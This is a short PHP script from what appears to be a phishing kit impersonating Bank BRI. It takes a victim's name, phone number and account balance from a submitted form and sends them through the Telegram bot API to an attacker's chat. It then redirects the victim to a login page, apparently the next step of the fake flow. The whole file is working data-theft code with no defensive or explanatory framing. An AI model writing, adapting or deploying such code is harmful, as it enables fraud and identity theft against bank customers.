<?php
include "telegram.php";
session_start();

$nama = $_POST['nama'];
$nohp = $_POST['nohp'];
$saldo = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['nomor'] = $nohp;
$_SESSION['saldo'] = $saldo;

$message = "
( Bank BRI | No HP | ".$nohp.")

- Nama Lengkap : ".$nama."
- No HP : ".$nohp."
- Saldo : ".$saldo."

 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../login.php');
?>
